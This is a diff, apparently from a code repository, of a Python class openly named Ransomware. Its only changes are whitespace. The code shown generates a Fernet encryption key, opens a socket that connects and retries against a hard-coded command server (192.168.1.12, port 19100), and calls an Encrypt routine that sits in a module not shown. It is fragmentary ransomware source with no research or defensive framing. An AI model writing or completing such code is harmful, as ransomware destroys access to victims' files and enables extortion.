@@ -4,7 +4,7 @@ from modules.crypto import Fernet, Encrypt
 from socket import socket, AF_INET, SOCK_STREAM
 
 class Ransomware:
-
+    
     def __init__(self, host: str, port: int) -> None:
         self.key = Fernet.generate_key()
         self.host = host
@@ -12,7 +12,6 @@ class Ransomware:
         self.system: System = System()
         self.server: socket = socket(AF_INET, SOCK_STREAM)
         self.Private = Fernet(self.key)
-
 
     def ConnectServer(self, connected = False) -> None:
         retries = 0
@@ -32,6 +31,7 @@ class Ransomware:
     
     def Encrypted(self):
         Encrypt(self.Private)
+
 
 if __name__ == '__main__':
     bot = Ransomware('192.168.1.12', 19100)
